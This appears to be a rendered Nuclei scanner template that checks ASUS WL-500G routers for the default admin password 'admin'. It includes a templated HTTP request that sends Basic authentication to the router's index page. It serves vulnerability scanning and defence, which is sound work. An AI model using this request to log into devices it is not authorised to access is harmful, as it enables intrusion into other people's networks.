# Nuclei Template: ASUS WL-500G - Default Login
**Template ID:** asus-wl500g-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`asus-wl500g-default-login.yaml`)

## Vulnerability Information & PoC

## Description
ASUS WL-500 contains a default login vulnerability. Default admin login password 'admin' was found.

## Steps to reproduce / Exploit Payload
```http
GET /index.asp HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

